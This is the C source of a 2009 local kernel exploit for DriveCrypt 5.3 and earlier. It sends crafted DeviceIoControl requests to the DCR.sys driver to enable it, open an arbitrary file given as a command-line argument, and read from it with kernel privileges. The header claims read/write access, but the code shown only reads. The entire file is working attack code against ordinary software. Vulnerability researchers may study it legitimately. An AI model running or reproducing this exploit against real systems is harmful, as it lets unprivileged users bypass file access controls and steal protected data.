/* drivecrypt-fopen.c
 *
 * Copyright (c) 2009 by <mu-b@digit-labs.org>
 *
 * DriveCrypt <= 5.3 local kernel arbitrary file read/write exploit
 * by mu-b - Sun 16 Aug 2009
 *
 * - Tested on: DCR.sys
 *
 * Compile: MinGW + -lntdll
 *
 *    - Private Source Code -DO NOT DISTRIBUTE -
 * http://www.digit-labs.org/ -- Digit-Labs 2009!@$!
 */

#include <stdio.h>
#include <stdlib.h>

#include <windows.h>
#include <ddk/ntapi.h>

#define DCR_IOCTL   0x00073800

struct ioctl_enable_req {
  DWORD dAction;
  DWORD dFlag;
  UCHAR pad[0x20];
  PUCHAR lpVerBuffer;
} lpRequest;

static DWORD
dcrypt_ZwCreateFile (HANDLE hDrv, const PUCHAR lpFileName, HANDLE *hFile)
{
  struct ioctl_open_req {
    DWORD dAction;
    DWORD dFlag;
    PUCHAR lpFileName;
    UCHAR pad[0x0C];
    HANDLE *hFile;
    UCHAR _pad[0x0C];
    PUCHAR lpVerBuffer;
  } lpRequest;
  UCHAR lpFileBuffer[256], lpVerBuffer[256];
  DWORD dReturnLen;
  BOOL bResult;

  snprintf (lpFileBuffer, sizeof lpFileBuffer, "\\??\\%s", lpFileName);

  memset (&lpRequest, 0, sizeof lpRequest);
  lpRequest.dAction = 63;
  lpRequest.dFlag = 0;
  lpRequest.lpFileName = lpFileBuffer;
  lpRequest.hFile = hFile;
  lpRequest.lpVerBuffer = lpVerBuffer;

#ifdef _DEBUG_
  printf ("* opening file...\n");
#endif
  bResult = DeviceIoControl (hDrv, DCR_IOCTL,
                             &lpRequest, sizeof lpRequest,
                             &lpRequest, sizeof lpRequest, &dReturnLen, 0);
  if (!bResult)
    {
      return (-1);
    }

#ifdef _DEBUG_
  printf ("** file: %s, handle: %08X\n", lpFileBuffer, *hFile);
  printf ("* done\n");
#endif

  return (0);
}

static HANDLE
dcrypt_ZwReadFile (HANDLE hDrv, HANDLE hFile, PCHAR lpBuf, DWORD dLen, DWORD offset)
{
  struct read_opts {
    HANDLE hFile;
    UCHAR pad[0x4];
    LARGE_INTEGER offset;
    PUCHAR lpBuf;
    UCHAR _pad[0x4];
    DWORD dLen;
    DWORD dAction;
    DWORD zero;
    DWORD dRlen;
  } lpOpts;

  struct ioctl_open_req {
    DWORD dAction;
    DWORD dFlag;
    struct read_opts *lpOpts;
    UCHAR pad[0x10];
    UCHAR _pad[0x0C];
    PUCHAR lpVerBuffer;
  } lpRequest;
  UCHAR lpVerBuffer[256];
  DWORD dReturnLen;
  BOOL bResult;

  memset (&lpOpts, 0, sizeof lpOpts);
  lpOpts.hFile = hFile;
  lpOpts.offset.LowPart = offset;
  lpOpts.lpBuf = lpBuf;
  lpOpts.dLen = dLen;
  lpOpts.dAction = 0;

  memset (&lpRequest, 0, sizeof lpRequest);
  lpRequest.dAction = 64;
  lpRequest.dFlag = 0;
  lpRequest.lpOpts = &lpOpts;
  lpRequest.lpVerBuffer = lpVerBuffer;

#ifdef _DEBUG_
  printf ("* reading from file...\n");
#endif
  bResult = DeviceIoControl (hDrv, DCR_IOCTL,
                             &lpRequest, sizeof lpRequest,
                             &lpRequest, sizeof lpRequest, &dReturnLen, 0);
  if (!bResult)
    {
      fprintf (stderr, "* DeviceIoControl failed\n");
      exit (EXIT_FAILURE);
    }

#ifdef _DEBUG_
  printf ("** read: %.*s [%d-bytes]\n", lpOpts.dRlen, lpBuf, lpOpts.dRlen);
  printf ("* done\n");
#endif

  return (hFile);
}

int
main (int argc, char **argv)
{
  struct ioctl_enable_req req;
  CHAR buf[1024], filebuf[256], readbuf[256];
  HANDLE hFile, hReadFile;
  DWORD rlen;
  BOOL result;

  printf ("DriveCrypt <= 5.3 local kernel arbitrary file read/write exploit\n"
          "by: <mu-b@digit-labs.org>\n"
          "http://www.digit-labs.org/ -- Digit-Labs 2009!@$!\n\n");

  hFile = CreateFileA ("\\\\.\\DCR", FILE_EXECUTE,
                       FILE_SHARE_READ|FILE_SHARE_WRITE, NULL,
                       OPEN_EXISTING, 0, NULL);
  if (hFile == INVALID_HANDLE_VALUE)
    {
      fprintf (stderr, "* CreateFileA failed, %d\n", hFile);
      exit (EXIT_FAILURE);
    }

  memset (&req, 0, sizeof req);
  req.dAction = 0x153;
  req.dFlag = 0;
  req.lpVerBuffer = buf;

  printf ("* enabling driver...\n");
  result = DeviceIoControl (hFile, DCR_IOCTL,
                            &req, sizeof req, &req, sizeof req, &rlen, 0);
  if (!result)
    {
      fprintf (stderr, "* DeviceIoControl failed\n");
      exit (EXIT_FAILURE);
    }
  printf ("** version: 0x%08X [%s], %s\n", *(int *) &buf[8], &buf[12], &buf[19]);
  printf ("* done\n");

  dcrypt_ZwCreateFile (hFile, argv[1], &hReadFile);
  dcrypt_ZwReadFile (hFile, hReadFile, readbuf, 256, 0);

  CloseHandle (hFile);

  return (EXIT_SUCCESS);
}